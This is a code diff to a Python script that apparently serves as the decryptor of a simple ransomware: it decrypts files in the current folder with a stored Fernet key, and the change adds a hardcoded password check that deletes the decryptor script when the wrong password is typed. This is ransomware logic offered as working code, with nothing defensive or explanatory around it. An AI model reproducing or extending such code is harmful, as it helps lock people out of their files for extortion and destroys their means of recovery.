@@ -9,9 +9,14 @@ for file in os.listdir():
                 files.append(file)
 with open("thekey.key","rb") as key:
         secretkey = key.read()
-for file in files:
-        with open(file,"rb") as thefile:
-                content = thefile.read()
-        contents_decrypted = Fernet(secretkey).decrypt(content)
-        with open(file , "wb") as thefile:
-                thefile.write(contents_decrypted)
+password = "jsKSO21?sk%SLµ"
+usr_inp = input("password\n")
+if password == usr_inp:
+        for file in files:
+                with open(file,"rb") as thefile:
+                        content = thefile.read()
+                contents_decrypted = Fernet(secretkey).decrypt(content)
+                with open(file , "wb") as thefile:
+                        thefile.write(contents_decrypted)
+else:
+        os.remove("decrypt.py")
